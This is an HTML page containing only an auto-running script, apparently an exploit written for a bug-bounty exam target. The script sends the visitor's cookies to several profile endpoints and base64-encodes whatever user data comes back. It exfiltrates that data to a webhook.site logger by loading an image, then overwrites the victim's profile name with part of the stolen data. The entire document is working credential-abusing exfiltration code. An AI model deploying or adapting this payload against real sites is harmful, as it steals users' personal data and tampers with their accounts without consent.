<!DOCTYPE html>
<html>
<body>
    <script>
        const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
        const api = "https://api-bugbounty-exam.hashacademy.co/api";

        async function findIdentity() {
            // Common endpoints for user info
            const endpoints = [
                "/auth/user",
                "/auth/profile",
                "/users/me",
                "/profile"
            ];

            for (let path of endpoints) {
                try {
                    const res = await fetch(api + path, { credentials: "include" });
                    const data = await res.json();
                    
                    if (res.ok) {
                        // If we find the right path, send the whole JSON to the webhook
                        const leaked = btoa(JSON.stringify(data));
                        new Image().src = `${logger}/?found_path=${path}&data=${leaked}`;
                        
                        // Also try to update YOUR profile with the bot's data as a backup
                        await fetch(api + "/auth/profile", {
                            method: "PATCH",
                            headers: { "Content-Type": "application/json" },
                            credentials: "include",
                            body: JSON.stringify({ "fullName": "FLAG_" + leaked.substring(0, 20) })
                        });
                    }
                } catch (e) {}
            }
        }
        findIdentity();
    </script>
</body>
</html>
